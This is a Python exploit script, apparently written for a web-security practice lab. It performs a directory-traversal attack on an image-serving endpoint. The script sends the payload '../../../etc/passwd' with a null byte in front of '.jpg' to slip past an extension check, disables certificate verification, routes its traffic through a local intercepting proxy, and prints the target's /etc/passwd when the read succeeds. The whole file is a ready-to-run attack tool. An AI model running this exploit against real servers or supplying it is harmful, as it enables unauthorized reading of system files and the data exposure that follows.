import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def directory_traversal_exploit(url):
    image_url = (
        url +
        "/image?filename=../../../etc/passwd%0048.jpg")
    response = requests.get(
        image_url,
        verify=False,
        proxies=proxies)
    if 'root:x' in response.text:
        return response.text
    raise ValueError("Directory traversal failed")

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        print("[+] Starting Directory Traversal exploit...")
        file = directory_traversal_exploit(url)
        print("[+] Contents of /etc/passwd: \n" + file)
    except IndexError:
        print("[+] Usage: %s <url>" %sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Directory Traversal exploit failed.")
        sys.exit(FAIL)    